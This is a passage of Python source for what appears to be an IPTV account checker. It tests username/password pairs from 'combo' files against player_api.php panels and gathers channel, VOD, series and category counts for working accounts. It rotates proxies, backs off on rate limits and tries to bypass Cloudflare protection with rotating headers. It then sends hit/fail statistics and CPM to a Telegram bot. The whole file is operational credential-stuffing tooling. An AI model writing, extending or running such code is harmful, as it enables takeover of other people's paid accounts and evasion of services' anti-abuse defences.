        if not hasattr(self, 'cf_detector'):
            self.cf_detector = CloudflareDetector()

        if not bypass_cloudflare and domain not in self.cf_detector.detection_cache:
            bypass_cloudflare = self.cf_detector.is_cloudflare_protected(url)
        elif domain in self.cf_detector.cloudflare_domains:
            bypass_cloudflare = True

        if session is None:
            _session = self.create_session()
            close_session = True
        else:
            _session = session
            close_session = False

        if headers is None:
            if bypass_cloudflare:
                headers = self.cf_detector.get_bypass_headers(url, attempt=1)
            else:
                headers = get_headers(url)

        if timeout is None:
            timeout = (8, 12) if bypass_cloudflare else (5, 10)

        max_attempts = 4 if bypass_cloudflare else 2

        for attempt in range(max_attempts):
            try:
                if bypass_cloudflare and attempt > 0:

                    headers = self.cf_detector.get_bypass_headers(url, attempt + 1)

                    time.sleep(random.uniform(1, 3))

                response = _session.get(
                    url,
                    proxies=proxies,
                    timeout=timeout,
                    stream=stream,
                    allow_redirects=allow_redirects,
                    headers=headers
                )

                if bypass_cloudflare and self._is_cloudflare_blocked(response):
                    if attempt < max_attempts - 1:
                        logger.debug(f"Cloudflare bloqueo detectado, intento {attempt + 1}")
                        continue
                    else:
                        logger.warning(f"No se pudo bypasear Cloudflare en {url}")

                if response.status_code in [200, 401]:  
                    return response
                elif response.status_code == 429:

                    time.sleep(random.uniform(2, 5))
                    if attempt < max_attempts - 1:
                        continue

                return response

            except (requests.exceptions.ConnectTimeout, requests.exceptions.ReadTimeout):
                if proxies and hasattr(proxy_manager, 'enabled') and proxy_manager.enabled:
                    proxy_manager.report_proxy_timeout(proxies, time.time() - start_time)

                if attempt < max_attempts - 1:
                    time.sleep(0.5)
                    continue
                return None

            except requests.exceptions.RequestException as e:
                if proxies and hasattr(proxy_manager, 'enabled') and proxy_manager.enabled:
                    proxy_manager.remove_proxy(proxies)

                if attempt < max_attempts - 1:
                    time.sleep(0.5)
                    continue
                return None

        if close_session:
            _session.close()

        return None

    def _is_cloudflare_blocked(self, response):
        """Verifica si Cloudflare bloqueó la petición"""
        if not response:
            return False

        if response.status_code in [403, 503, 521, 522, 523, 524]:
            return True

        if hasattr(response, 'text'):
            text = response.text.lower()
            block_patterns = [
                'checking your browser',
                'cloudflare',
                'please wait while we are checking',
                'ddos protection'
            ]
            return any(pattern in text for pattern in block_patterns)

        return False

server_content_info = {
    'envivo': "",
    'peliculas': "",
    'series': "",
    'last_updated': None,
    'panel_url': ""
}

content_info_lock = threading.Lock()

def c_datos(panel, user, pas, session=None, proxy=None):
    """
    Obtiene conteos REALES de canales, películas y series.
    Usa lectura en streaming para contar objetos JSON sin descargar toda la respuesta,
    lo que permite manejar respuestas de cientos de MB sin timeout.
    """
    global server_content_info, content_info_lock
    envivo = "?"
    peliculas = "?"
    series = "?"

    logger.debug(f"=== INICIANDO c_datos para {user} en {panel} ===")

    base = panel if panel.startswith(("http://", "https://")) else f"http://{panel}"

    if session is None:
        ses = requests.Session()
        ses.verify = False
        if proxy:
            ses.proxies = proxy
        close_session = True
    else:
        ses = session
        close_session = False

    headers = get_headers(base)

    def count_json_array_streaming(url, label):
        """
        Cuenta elementos de un array JSON usando streaming.
        Lee el response chunk a chunk y cuenta las comas de nivel raíz
        sin necesidad de descargar todo el JSON.
        Timeout total: 20s de lectura (suficiente para cualquier servidor).
        """
        try:
            resp = ses.get(url, headers=headers, timeout=(5, 20),
                           verify=False, stream=True)
            logger.debug(f"{label}: HTTP {resp.status_code}")
            if resp.status_code != 200:
                return "?"

            depth = 0
            root_objects = 0
            in_string = False
            escape_next = False
            started = False
            bytes_read = 0
            max_bytes = 10 * 1024 * 1024  

            for chunk in resp.iter_content(chunk_size=8192):
                if not chunk:
                    continue
                bytes_read += len(chunk)

                try:
                    text = chunk.decode('utf-8', errors='ignore')
                except Exception:
                    continue

                for ch in text:
                    if escape_next:
                        escape_next = False
                        continue
                    if ch == '\\' and in_string:
                        escape_next = True
                        continue
                    if ch == '"' and not escape_next:
                        in_string = not in_string
                        continue
                    if in_string:
                        continue
                    if ch == '[' and not started and depth == 0:
                        started = True
                        continue
                    if not started:
                        continue
                    if ch == '{':
                        depth += 1
                        if depth == 1:
                            root_objects += 1
                    elif ch == '}':
                        depth -= 1
                    elif ch == ']' and depth == 0:

                        resp.close()
                        logger.debug(f"[OK] {label}: {root_objects} elementos ({bytes_read} bytes leídos)")
                        return str(root_objects)

                if bytes_read >= max_bytes:

                    resp.close()
                    logger.debug(f"{label}: límite de lectura alcanzado, conteo parcial={root_objects}")
                    return str(root_objects) if root_objects > 0 else "?"

            resp.close()
            if root_objects > 0:
                logger.debug(f"[OK] {label}: {root_objects} (stream terminado)")
                return str(root_objects)
            return "?"

        except requests.exceptions.Timeout:
            logger.debug(f"{label}: TIMEOUT")
            return "?"
        except Exception as e:
            logger.debug(f"{label}: error {e}")
            return "?"

    url_live   = f"{base}/player_api.php?username={user}&password={pas}&action=get_live_streams"
    url_vod    = f"{base}/player_api.php?username={user}&password={pas}&action=get_vod_streams"
    url_series = f"{base}/player_api.php?username={user}&password={pas}&action=get_series"

    max_attempts = 2
    for attempt in range(max_attempts):
        if envivo == "?":
            envivo = count_json_array_streaming(url_live, "En Vivo")
        if peliculas == "?":
            peliculas = count_json_array_streaming(url_vod, "VOD")
        if series == "?":
            series = count_json_array_streaming(url_series, "Series")

        if envivo != "?" or peliculas != "?" or series != "?":
            logger.debug(f"[OK] Datos obtenidos en intento {attempt + 1}")
            break
        else:
            logger.debug(f"[FAIL] Intento {attempt + 1}/{max_attempts}, reintentando...")
            time.sleep(1)

    if close_session:
        ses.close()

    if envivo == "?" or peliculas == "?" or series == "?":
        try:
            with content_info_lock:
                panel_base = panel.split('/')[0] if '/' in panel else panel
                stored_panel = server_content_info['panel_url'].split('/')[0] if '/' in server_content_info['panel_url'] else server_content_info['panel_url']
                if server_content_info['last_updated'] and (panel_base == stored_panel or not stored_panel):
                    if envivo == "?" and server_content_info['envivo']:
                        envivo = server_content_info['envivo']
                    if peliculas == "?" and server_content_info['peliculas']:
                        peliculas = server_content_info['peliculas']
                    if series == "?" and server_content_info['series']:
                        series = server_content_info['series']
        except Exception as e:
            logger.debug(f"Error accediendo al caché de content_info: {e}")

    logger.debug(f"=== RESULTADO FINAL c_datos: Live={envivo}, VOD={peliculas}, Series={series} ===")
    return envivo, peliculas, series

def debug_c_datos(panel, user, pas, session=None, proxy=None):
    """Función de debug detallada para c_datos"""
    print(f"\n{Colors.CYAN}=== DEBUG C_DATOS ==={Colors.RESET}")
    print(f"Panel: {panel}")
    print(f"User: {user}")
    print(f"Password: {pas}")

    domain = panel.replace('http://', '').replace('https://', '').split('/')[0].split(':')[0]
    print(f"Dominio extraído: {domain}")

    is_anti_spam = any(spam_domain in domain for spam_domain in [
        'smarttvpanel.com', 'castlempire.site', 'xyza.ltd', 'tv.proyectox.vip'
    ])
    print(f"Es anti-spam: {is_anti_spam}")

    if panel.startswith("http://") or panel.startswith("https://"):
        base_url = panel
    else:
        base_url = f"http://{panel}"
    print(f"URL base: {base_url}")

    test_url = f"{base_url}/player_api.php?username={user}&password={pas}"
    print(f"URL de test: {test_url}")

    try:
        test_response = requests.get(test_url, timeout=2, verify=False)
        print(f"Test response status: {test_response.status_code}")
        print(f"Test response size: {len(test_response.text)} bytes")
        print(f"Test response headers: {dict(test_response.headers)}")
        print(f"Test response content (first 500 chars): {test_response.text[:500]}")

        try:
            test_data = test_response.json()
            print(f"Test JSON parsed successfully: {type(test_data)}")
            if isinstance(test_data, dict):
                print(f"Test JSON keys: {list(test_data.keys())}")
        except:
            print("Test response is not valid JSON")

    except Exception as e:
        print(f"Error en test de conectividad: {e}")

    print(f"{Colors.CYAN}=== FIN DEBUG C_DATOS ==={Colors.RESET}\n")

    return c_datos(panel, user, pas, session, proxy)

def is_empty_data(value):
    """Función auxiliar para verificar si un dato está vacío"""
    if value is None:
        return True

    value_str = str(value).strip()
    return value_str in ["", "?", "0", "null", "None"]

def has_valid_content_data(live, vod, series, categories=None):
    """Verifica si al menos uno de los datos de contenido es válido"""
    return (
        not is_empty_data(live) or
        not is_empty_data(vod) or 
        not is_empty_data(series) or
        (categories is not None and not is_empty_data(categories))
    )

def get_categories_with_session(panel_url, user, password, session, proxy=None):
    """
    Obtiene categorías de canales en vivo con conteo real de canales por categoría.
    Usa streaming para contar canales sin descargar todo el JSON de get_live_streams.
    """
    try:
        logger.debug(f"Obteniendo categorías para {user} en {panel_url}")

        base = panel_url if panel_url.startswith(("http://", "https://")) else f"http://{panel_url}"
        url_categorias = f"{base}/player_api.php?username={user}&password={password}&action=get_live_categories"
        url_canales    = f"{base}/player_api.php?username={user}&password={password}&action=get_live_streams"

        headers = get_headers(base)

        ses = session if session is not None else requests.Session()
        own_session = session is None
        if own_session and proxy:
            ses.proxies = proxy

        try:
            req1 = ses.get(url_categorias, headers=headers, timeout=(5, 15), verify=False)
        except Exception as e:
            logger.error(f"Error obteniendo categorías: {e}")
            if own_session:
                ses.close()
            return "<<no data>>"

        if req1.status_code != 200:
            logger.warning(f"Error obteniendo categorías: Status {req1.status_code}")
            if own_session:
                ses.close()
            return "<<no data>>"

        try:
            categories = req1.json()
        except json.JSONDecodeError as e:
            logger.error(f"Error parseando JSON de categorías: {e}")
            if own_session:
                ses.close()
            return "<<no data>>"

        if not isinstance(categories, list) or len(categories) == 0:
            logger.warning(f"Lista de categorías vacía o formato inesperado")
            if own_session:
                ses.close()
            return "<<no data>>"

        category_count = {}
        try:
            resp = ses.get(url_canales, headers=headers, timeout=(5, 30),
                           verify=False, stream=True)
            if resp.status_code == 200:

                import re as _re
                cat_id_pattern = _re.compile(rb'"category_id"\s*:\s*"?(\d+)"?')
                bytes_read = 0
                max_bytes = 15 * 1024 * 1024  

                for chunk in resp.iter_content(chunk_size=65536):
                    if not chunk:
                        continue
                    bytes_read += len(chunk)
                    for m in cat_id_pattern.finditer(chunk):
                        cat_id = m.group(1).decode('utf-8', errors='ignore')
                        category_count[cat_id] = category_count.get(cat_id, 0) + 1
                    if bytes_read >= max_bytes:
                        logger.debug(f"Límite de streaming alcanzado ({max_bytes} bytes), conteo parcial")
                        break
                resp.close()
                logger.debug(f"Conteo de canales por categoría completado: {sum(category_count.values())} canales totales")
            else:
                logger.warning(f"Error obteniendo canales: Status {resp.status_code}")
                resp.close()
        except Exception as e:
            logger.warning(f"Error en streaming de canales (se usará conteo 0): {e}")

        if own_session:
            ses.close()

        cate = ""
        for category in categories:
            category_id = str(category.get("category_id", ""))
            category_name = category.get("category_name", "").replace("\\/", "/").strip()
            if not category_name:
                continue
            count = category_count.get(category_id, 0)
            cate += f" ➠ {category_name} [{count}]\n"

        logger.debug(f"Categorías formateadas: {len(categories)} categorías, {len(cate)} caracteres")
        return cate if cate else "<<no data>>"

    except requests.exceptions.Timeout:
        logger.error(f"Timeout obteniendo categorías para {user}")
        return "<<no data>>"
    except requests.exceptions.ConnectionError as e:
        logger.error(f"Error de conexión obteniendo categorías: {e}")
        return "<<no data>>"
    except Exception as e:
        logger.error(f"Error inesperado obteniendo categorías: {e}")
        return "<<no data>>"

def get_or_fetch_server_content(panel_url, user, password, session, proxy=None):
    """
    Obtiene contenido del servidor con soporte Cloudflare
    """
    global server_content_cache, content_cache_lock

    logger.debug(f"get_or_fetch_server_content llamada para {user} en {panel_url}")

    if 'cloudflare_bypass' in globals() and cloudflare_bypass:
        try:
            from urllib.parse import urlparse
            domain = urlparse(panel_url).netloc

            if cloudflare_bypass.is_cloudflare_protected(domain):
                logger.info(f"🌙 Usando bypass para obtener contenido de {domain}")

                envivo, peliculas, series = cloudflare_bypass.get_content_with_cloudflare_bypass(
                    panel_url,
                    user,
                    password,
                    session,
                    proxy
                )

                livelist = ""
                if global_get_categories:
                    logger.info(f"🌙 Obteniendo categorías con bypass")
                    livelist = cloudflare_bypass.get_categories_with_cloudflare_bypass(
                        panel_url,
                        user,
                        password,
                        session,
                        proxy
                    )

                logger.info(f"✅ Contenido con bypass: Live={envivo}, VOD={peliculas}, Series={series}")
                return envivo, peliculas, series, livelist

        except Exception as e:
            logger.error(f"Error en bypass de contenido: {e}")
            import traceback
            traceback.print_exc()

    panel_key = panel_url.replace('http://', '').replace('https://', '')
    if panel_key.endswith('/'):
        panel_key = panel_key[:-1]

    logger.debug(f"Panel key: {panel_key}")

    def is_valid_cached_data(data):
        if not data:
            return False
        live = data.get('envivo', '?')
        vod = data.get('peliculas', '?')
        series = data.get('series', '?')
        categories = data.get('categories', '')
        valid_live = str(live).strip() not in ["", "?", "<<no data>>"]
        valid_vod = str(vod).strip() not in ["", "?", "<<no data>>"]
        valid_series = str(series).strip() not in ["", "?", "<<no data>>"]
        valid_categories = str(categories).strip() not in ["", "?", "<<no data>>"]
        return valid_live or valid_vod or valid_series or valid_categories

    def is_value_valid(value):
        str_value = str(value).strip()
        return str_value not in ["", "?", "<<no data>>"] and len(str_value) > 0

    previous_envivo, previous_peliculas, previous_series, previous_categories = "?", "?", "?", ""
    cache_exists = False

    with content_cache_lock:
        if panel_key in server_content_cache:
            cached = server_content_cache[panel_key]
            previous_envivo = cached.get('envivo', '?')
            previous_peliculas = cached.get('peliculas', '?')
            previous_series = cached.get('series', '?')
            previous_categories = cached.get('categories', '')
            cache_exists = True
            logger.debug(f"Valores previos en caché: Live={previous_envivo}, VOD={previous_peliculas}, Series={previous_series}")

    with content_cache_lock:
        if panel_key in server_content_cache:
            cached_data = server_content_cache[panel_key]
            if is_valid_cached_data(cached_data):
                envivo_cache = cached_data.get('envivo', '?')
                peliculas_cache = cached_data.get('peliculas', '?')
                series_cache = cached_data.get('series', '?')
                categories_cache = cached_data.get('categories', '')
                if (is_value_valid(envivo_cache) and
                    is_value_valid(peliculas_cache) and
                    is_value_valid(series_cache)):
                    cached_data['hits_count'] = cached_data.get('hits_count', 0) + 1
                    logger.info(f"USANDO CACHÉ COMPLETO VÁLIDO para {panel_key} (hit #{cached_data['hits_count']})")
                    result = (
                        envivo_cache,
                        peliculas_cache,
                        series_cache,
                        categories_cache if is_value_valid(categories_cache) else ''
                    )
                    logger.debug(f"Datos del caché válidos: {result}")
                    return result
                else:
                    logger.warning(f"Caché parcialmente válido para {panel_key}, obteniendo datos frescos para completar...")
            else:
                logger.info(f"Cache inválido para {panel_key}, obteniendo datos frescos...")

    logger.info(f"Obteniendo datos frescos del servidor {panel_key}...")
    max_retries = 3
    envivo, peliculas, series, categories = "?", "?", "?", ""

    for attempt in range(max_retries):
        try:
            temp_envivo, temp_peliculas, temp_series = c_datos(panel_url, user, password, session, proxy)
            logger.info(f"Intento {attempt + 1}/{max_retries} - Datos obtenidos: Live={temp_envivo}, VOD={temp_peliculas}, Series={temp_series}")
            if is_value_valid(temp_envivo):
                envivo = temp_envivo
            elif is_value_valid(previous_envivo):
                envivo = previous_envivo
            if is_value_valid(temp_peliculas):
                peliculas = temp_peliculas
            elif is_value_valid(previous_peliculas):
                peliculas = previous_peliculas
            if is_value_valid(temp_series):
                series = temp_series
            elif is_value_valid(previous_series):
                series = previous_series
        except Exception as e:
            logger.error(f"Error en c_datos (intento {attempt + 1}/{max_retries}): {e}")
            if is_value_valid(previous_envivo) and not is_value_valid(envivo):
                envivo = previous_envivo
            if is_value_valid(previous_peliculas) and not is_value_valid(peliculas):
                peliculas = previous_peliculas
            if is_value_valid(previous_series) and not is_value_valid(series):
                series = previous_series

        temp_categories = ""
        if global_get_categories and not categories:  
            try:
                logger.info(f"OBTENIENDO CATEGORÍAS para {panel_key} (global_get_categories=True)...")
                import signal
                def timeout_handler(signum, frame):
                    raise TimeoutError("Timeout obteniendo categorías")
                if os.name == 'nt':
                    import threading
                    category_result = [None]
                    category_error = [None]
                    category_completed = [False]
                    def get_categories_thread():
                        try:
                            result = get_categories_with_session(panel_url, user, password, session, proxy)
                            category_result[0] = result
                            category_completed[0] = True
                            logger.debug(f"✅ Thread de categorías completado: {len(result) if result else 0} caracteres")
                        except Exception as e:
                            category_error[0] = e
                            category_completed[0] = True
                            logger.error(f"❌ Error en thread de categorías: {e}")
                    thread = threading.Thread(target=get_categories_thread, daemon=False)
                    thread.start()
                    thread.join(timeout=60)
                    if thread.is_alive():
                        logger.warning(f"⚠️ Categorías tardando más de 60s - CONTINUANDO sin esperar más (thread sigue en background)")
                        temp_categories = "<<timeout>>"
                    elif category_error[0]:
                        logger.error(f"❌ Error obteniendo categorías: {category_error[0]}")
                        raise category_error[0]
                    else:
                        temp_categories = category_result[0] or ""
                        logger.debug(f"✅ Categorías obtenidas del thread: {len(temp_categories)} caracteres")
                else:
                    signal.signal(signal.SIGALRM, timeout_handler)
                    signal.alarm(60)
                    try:
                        temp_categories = get_categories_with_session(panel_url, user, password, session, proxy)
                    finally:
                        signal.alarm(0)
                if temp_categories and len(temp_categories) > 0:
                    logger.info(f"📊 Categorías obtenidas: {len(temp_categories)} caracteres")
                else:
                    logger.warning(f"⚠️ Categorías vacías o no obtenidas")
                if temp_categories and temp_categories not in ["<<no data>>", "?", "", "<<timeout>>"]:
                    categories = temp_categories
                    logger.info(f"✅ Categorías válidas asignadas: {len(categories)} caracteres")
                elif is_value_valid(previous_categories) and previous_categories not in ["<<no data>>"]:
                    categories = previous_categories
                    logger.info(f"📦 Usando categorías previas del caché ({len(categories)} caracteres)")
                else:
                    logger.warning("⚠️ No se obtuvieron categorías válidas - CONTINUANDO sin categorías")
                    categories = ""
            except TimeoutError as e:
                logger.warning(f"⚠️ TIMEOUT obteniendo categorías: {e} - CONTINUANDO sin categorías")
                categories = previous_categories if is_value_valid(previous_categories) else ""
            except Exception as e:
                logger.error(f"⚠️ Error obteniendo categorías: {e} - CONTINUANDO sin categorías")
                if is_value_valid(previous_categories) and previous_categories not in ["<<no data>>"]:
                    categories = previous_categories
                    logger.info(f"📦 Usando categorías previas del caché por error ({len(categories)} caracteres)")
                else:
                    categories = ""
        elif not global_get_categories:
            logger.debug(f"Categorías deshabilitadas (global_get_categories=False)")

        all_valid = is_value_valid(envivo) and is_value_valid(peliculas) and is_value_valid(series)
        if all_valid:
            logger.info(f"Todos los datos válidos obtenidos en intento {attempt + 1}/{max_retries}")
            break
        else:
            logger.warning(f"Algunos datos inválidos en intento {attempt + 1}/{max_retries} (Live:{envivo}, VOD:{peliculas}, Series:{series}), reintentando...")
            if attempt < max_retries - 1:
                time.sleep(1)

    has_valid_data = is_value_valid(envivo) or is_value_valid(peliculas) or is_value_valid(series)
    if not has_valid_data and is_value_valid(categories):
        logger.warning(f"⚠️ Solo se obtuvieron categorías, sin datos de contenido (Live/VOD/Series)")
    if has_valid_data:
        with content_cache_lock:
            server_content_cache[panel_key] = {
                'envivo': envivo,
                'peliculas': peliculas,
                'series': series,
                'categories': categories,
                'first_hit_time': time.time(),
                'hits_count': 1,
                'source': 'first_hit_valid'
            }
            logger.info(f"✅ DATOS GUARDADOS EN CACHÉ para {panel_key} (Live:{envivo}, VOD:{peliculas}, Series:{series}, Categories:{len(categories) if categories else 0} chars)")
    else:
        logger.warning(f"⚠️ No se pudieron obtener datos válidos para {panel_key} después de {max_retries} intentos - CONTINUANDO DE TODOS MODOS")

    result = (envivo, peliculas, series, categories)
    logger.debug(f"Resultado final: {result}")
    return result

def get_categories_formatted_safe(panel, user, password, session=None, proxy=None):
        """Versión segura de obtención de categorías con logs detallados"""

        try:
            logger.debug(f"INICIANDO obtención de categorías para {user} en {panel}")

            if panel.startswith("http://") or panel.startswith("https://"):
                url_cats = f"{panel}/player_api.php?username={user}&password={password}&action=get_live_categories"
            else:
                url_cats = f"https://{panel}/player_api.php?username={user}&password={password}&action=get_live_categories"

            logger.debug(f"URL de categorías: {url_cats}")

            if session is None:
                ses = http_manager.create_session()
                if proxy:
                    ses.proxies = proxy
                    logger.debug(f"Usando proxy para categorías: {proxy}")
                close_session = True
            else:
                ses = session
                close_session = False

            is_special = self._check_special_domain(panel) if hasattr(self, '_check_special_domain') else False
            if is_special:
                headers = {
                    'content-type': 'application/json; charset=UTF-8',
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 9; ANE-LX3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36',
                    'Host': panel.replace('http://', '').replace('https://', ''),
                    'Connection': 'Keep-Alive',
                    'Accept-Encoding': 'gzip'
                }
                logger.debug(f"Usando headers especiales para {panel}")
            else:
                headers = get_headers(url_cats)

            logger.debug(f"Realizando solicitud de categorías...")

            response = ses.get(url_cats, headers=headers, timeout=(0.5, 1.5), verify=False)

            logger.debug(f"Respuesta de categorías: {response.status_code}")

            if close_session:
                ses.close()

            if response.status_code == 200:
                try:
                    categories = response.json()
                    logger.debug(f"JSON parseado correctamente. Tipo: {type(categories)}, Cantidad: {len(categories) if isinstance(categories, list) else 'No es lista'}")

                    if isinstance(categories, list) and len(categories) > 0:
                        category_list = []
                        for i, cat in enumerate(categories[:20]):
                            if isinstance(cat, dict) and 'category_name' in cat:
                                name = cat['category_name']
                                category_list.append(f"├● 📺 {name}")
                                logger.debug(f"Categoría {i+1}: {name}")

                        result = '\n'.join(category_list) if category_list else ""
                        logger.debug(f"Categorías formateadas: {len(category_list)} categorías")
                        return result
                    else:
                        logger.debug("Lista de categorías vacía o no es lista")
                        return ""

                except json.JSONDecodeError as e:
                    logger.error(f"Error parseando JSON de categorías: {e}")
                    logger.debug(f"Respuesta raw: {response.text[:200]}...")
                    return ""
            else:
                logger.warning(f"Error en respuesta de categorías: {response.status_code}")
                return ""

            return ""

        except Exception as e:
            logger.error(f"Error obteniendo categorías: {e}")
            return ""

def test_iptv_endpoint(panel, user, password, action="get_live_streams"):
    """Prueba un endpoint específico de IPTV"""
    try:
        if panel.startswith("http://") or panel.startswith("https://"):
            base_url = panel
        else:
            base_url = f"http://{panel}"

        url = f"{base_url}/player_api.php?username={user}&password={password}&action={action}"

        print(f"\n{Colors.YELLOW}Probando endpoint: {action}{Colors.RESET}")
        print(f"URL: {url}")

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json, text/plain, */*'
        }

        response = requests.get(url, headers=headers, timeout=2, verify=False)

        print(f"Status: {response.status_code}")
        print(f"Headers: {dict(response.headers)}")
        print(f"Content-Type: {response.headers.get('content-type', 'No especificado')}")
        print(f"Content-Length: {len(response.text)} bytes")

        if response.status_code == 200:
            try:
                data = response.json()
                if isinstance(data, list):
                    print(f"[OK] JSON valido - Lista con {len(data)} elementos")
                    if len(data) > 0:
                        print(f"Primer elemento: {data[0]}")
                elif isinstance(data, dict):
                    print(f"[OK] JSON valido - Diccionario con keys: {list(data.keys())}")
                else:
                    print(f"[OK] JSON valido - Tipo: {type(data)}")
            except:
                print(f"[FAIL] Respuesta no es JSON valido")
                print(f"Contenido (primeros 300 chars): {response.text[:300]}")
        else:
            print(f"[ERR] Error HTTP: {response.status_code}")
            print(f"Contenido: {response.text[:200]}")

    except Exception as e:
        print(f"[ERR] Error: {e}")

class GeoLocationManager:
    """Gestiona la obtención de información de geolocalización"""

    def __init__(self):
        self.geoip_db_path = 'GeoLite2-City.mmdb'
        self.geoip_available = os.path.exists(self.geoip_db_path) and GEOIP_ENABLED

    def get_location(self):
        """Obtiene la ubicación actual del usuario"""

        if self.geoip_available:
            location = self._get_location_geoip()
            if location:
                return location

        return self._get_location_api()

    def _get_location_geoip(self):
        """Obtiene la ubicación usando la base de datos GeoIP"""
        try:

            response = requests.get('https://ifconfig.me/ip', timeout=2)
            if response.status_code != 200:
                return None

            ip = response.text.strip()

            reader = geoip2.database.Reader(self.geoip_db_path)
            response = reader.city(ip)

            country_code = response.country.iso_code
            country_name = response.country.name

            if flag and country_code:
                flag_emoji = flag.flag(country_code)
                return f"{country_name} {flag_emoji}"
            else:
                return country_name

        except Exception as e:
            logger.debug(f"Error obteniendo ubicación con GeoIP: {e}")
            return None

    def _get_location_api(self):
        """Obtiene la ubicación usando una API pública"""
        apis = [
            'http://ip-api.com/json/',
            'https://ipapi.co/json/',
            'https://ipinfo.io/json'
        ]

        for api_url in apis:
            try:
                response = requests.get(api_url, timeout=2)
                if response.status_code == 200:
                    data = response.json()

                    if 'country' in data:
                        country_name = data.get('country', 'Unknown')
                    elif 'country_name' in data:
                        country_name = data.get('country_name', 'Unknown')
                    else:
                        continue

                    if 'countryCode' in data:
                        country_code = data.get('countryCode', '')
                    elif 'country_code' in data:
                        country_code = data.get('country_code', '')
                    else:
                        country_code = ''

                    if flag and country_code:
                        try:
                            flag_emoji = flag.flag(country_code)
                            return f"{country_name} {flag_emoji}"
                        except:
                            pass

                    return country_name
            except:
                continue

        return "Desconocido 🌍"

    def get_server_location(self, ip_or_domain):
        """Obtiene la ubicación de un servidor a partir de su IP o dominio"""
        try:

            if not re.match(r'^(\d{1,3}\.){3}\d{1,3}$', ip_or_domain):
                try:
                    ip = socket.gethostbyname(ip_or_domain)
                except:
                    return "Desconocido 🌍"
            else:
                ip = ip_or_domain

            api_url = f'http://ip-api.com/json/{ip}'
            response = requests.get(api_url, timeout=2)

            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    country_code = data.get('countryCode', '').upper()
                    country_name = data.get('country', 'Desconocido')

                    if flag and country_code:
                        flag_emoji = flag.flag(country_code)
                        return f"{country_name} {flag_emoji}"
                    else:
                        return country_name
        except Exception as e:
            logger.debug(f"Error obteniendo ubicación del servidor {ip_or_domain}: {e}")

        return "Desconocido 🌍"

CONFIG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'jchecker_config.json')

class TelegramManager:
    def __init__(self):
        self.config_file = CONFIG_FILE
        self.token = None
        self.chat_id = None
        self.enabled = False
        self.user_name = ""

        self._ensure_config_file()
        self.load_config()

    def _get_country_info(self, portal):
        """Obtiene información del país del servidor"""
        try:
            import socket
            from urllib.parse import urlparse

            if portal.startswith(("http://", "https://")):
                host = urlparse(f"http://{portal}").netloc.split(':')[0]
            else:
                host = portal.split(':')[0]

            ip = socket.gethostbyname(host)
            urlGEOIP = f"http://ip-api.com/json/{ip}"
            response = requests.get(urlGEOIP, timeout=2, verify=False)

            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    country_name = data.get('country', 'Desconocido')
                    country_code = data.get('countryCode', '')

                    if country_code:

                        flag_emoji = get_country_flag(country_code)
                        return f"{flag_emoji} {country_name}"
                    else:
                        return f"🌍 {country_name}"

        except Exception as e:
            logger.debug(f"Error obteniendo país: {e}")

        return "🌍 Desconocido"

    def _get_connection_status(self, active_cons, max_cons):
        """Determina el estado basado en conexiones activas"""
        try:
            if active_cons == "N/A":
                active_cons = 0
            if max_cons == "N/A":
                max_cons = 0

            if str(active_cons) != "0" and str(max_cons) != "0":
                active = int(active_cons)
                maximum = int(max_cons)
                usage_percent = (active / maximum) * 100

                if usage_percent >= 80:
                    return {"emoji": "🔴", "text": "En Uso Alto"}
                elif usage_percent >= 50:
                    return {"emoji": "🟡", "text": "En Uso Medio"}
                else:
                    return {"emoji": "🟢", "text": "Disponible"}
            else:
                return {"emoji": "🟢", "text": "Disponible"}
        except:
            return {"emoji": "🟢", "text": "Disponible"}

    def _escape_html_safe(self, text):
        """Escapa caracteres especiales para HTML de forma segura"""
        if not text:
            return ""

        text = str(text)
        text = text.replace('&', '&amp;')
        text = text.replace('<', '&lt;')
        text = text.replace('>', '&gt;')
        text = text.replace('"', '&quot;')
        text = text.replace("'", '&#x27;')

        return text

    def _format_categories_telegram(self, categories):
        """Formatea categorías para Telegram de manera compacta"""
        if not categories:
            return ""

        try:
            lines = categories.split('\n')
            formatted_lines = []

            for i, line in enumerate(lines[:8]):  
                if line.strip():

                    cleaned_line = line.strip()

                    import re
                    cleaned_line = re.sub(r'^[├●📺\s-]+', '', cleaned_line)
                    cleaned_line = re.sub(r'^\s*➠\s*', '', cleaned_line)

                    cleaned_line = re.sub(r'[<>]', '', cleaned_line)
                    cleaned_line = re.sub(r'\s+', ' ', cleaned_line)

                    if cleaned_line.strip():
                        escaped_line = self._escape_html_safe(cleaned_line)
                        formatted_lines.append(f" ➥ 📺 {escaped_line}")

            if formatted_lines:

                total_categories = len([l for l in lines if l.strip()])
                if total_categories > 8:
                    formatted_lines.append(f"\n ➥➕ <i>Y {total_categories - 8} categorías más...</i>")

            return '\n'.join(formatted_lines)

        except Exception as e:
            logger.error(f"Error formateando categorías: {e}")
            return ""

    def send_summary_mod(self, stats_data):
        """Envía un resumen mejorado de la verificación a Telegram"""
        if not self.enabled or not self.token or not self.chat_id:
            return False

        try:
            bot = telebot.TeleBot(self.token)

            message = f"""<b>📊 RESUMEN DE VERIFICACIÓN COMPLETADA</b>
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    <b>🎯 INFORMACIÓN GENERAL</b>
    ┣━ 🌐 <b>Portal:</b> <code>{stats_data.get('portal', 'Desconocido')}</code>
    ┣━ 📁 <b>Combo:</b> <code>{os.path.basename(stats_data.get('combo_file', 'Desconocido'))}</code>
    ┣━ ⏱️ <b>Duración:</b> {self._format_time(stats_data.get('duration', 0))}
    ┗━ ⚡ <b>Velocidad:</b> {stats_data.get('cpm', 0)} CPM

    <b>📈 RESULTADOS OBTENIDOS</b>
    ┣━ ✅ <b>Hits:</b> {stats_data.get('hits', 0)}
    ┣━ ❌ <b>Fails:</b> {stats_data.get('fails', 0)}
    ┣━ ⚠️ <b>Custom:</b> {stats_data.get('custom', 0)}
    ┣━ 🔄 <b>Retries:</b> {stats_data.get('retries', 0)}
    ┗━ 🔍 <b>Total:</b> {stats_data.get('checked', 0)} verificadas

    <b>⚙️ CONFIGURACIÓN UTILIZADA</b>
    ┣━ 🤖 <b>Threads:</b> {stats_data.get('threads', 0)}
    ┣━ 🔌 <b>Proxies:</b> {'✅ Activados' if stats_data.get('proxies_enabled', False) else '❌ Desactivados'}
